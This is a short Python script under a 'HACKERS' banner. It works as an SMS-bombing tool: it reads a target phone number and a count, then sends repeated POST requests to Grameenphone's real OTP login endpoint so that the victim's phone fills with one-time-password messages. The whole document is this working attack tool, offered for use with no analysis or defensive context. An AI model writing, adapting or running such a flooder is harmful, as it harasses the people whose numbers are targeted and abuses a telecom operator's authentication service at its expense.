
import requests
from colorama import Fore


banner = """

  _    _          _____ _  ________ _____   _____ 
 | |  | |   /\   / ____| |/ /  ____|  __ \ / ____|
 | |__| |  /  \ | |    | ' /| |__  | |__) | (___  
 |  __  | / /\ \| |    |  < |  __| |  _  / \___ \ 
 | |  | |/ ____ \ |____| . \| |____| | \ \ ____) |
 |_|  |_/_/    \_\_____|_|\_\______|_|  \_\_____/ 
                                                  
                                                  
   """

print(banner)


mygpip="https://weblogin.grameenphone.com/backend/api/v1/otp"






valu= int(input("Enter Your Value : "))

phn = str(input("Enter Your Number : "))



nmr={'msisdn':phn}
for i in range(valu):
	requests.post(mygpip,data=nmr)
	print(Fore.GREEN+"successfully sent sms ")	
	#you need to api for use this tool
	
	
	